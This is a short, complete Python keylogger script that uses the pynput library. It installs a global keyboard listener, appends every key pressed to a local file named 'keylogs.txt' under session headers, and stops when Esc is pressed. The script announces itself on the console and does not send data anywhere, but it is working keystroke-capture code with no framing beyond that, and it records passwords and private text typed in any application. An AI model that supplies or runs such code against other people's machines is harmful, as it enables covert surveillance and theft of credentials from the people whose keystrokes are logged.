from pynput import keyboard
LOG_FILE = "keylogs.txt"

def write_new_session():
    """Write a new session header to the log file."""
    with open(LOG_FILE, "a") as f:
        f.write("\n\n--- New Session Started ---\n")

def on_press(key):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(key.char)
    except AttributeError:
        with open(LOG_FILE, "a") as f:
            f.write(f"[{key}]")

def on_release(key):
    if key == keyboard.Key.esc:
        print("Keylogger stopped.")
        return False

print("Keylogger started. Press 'Esc' to stop.")
write_new_session()
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
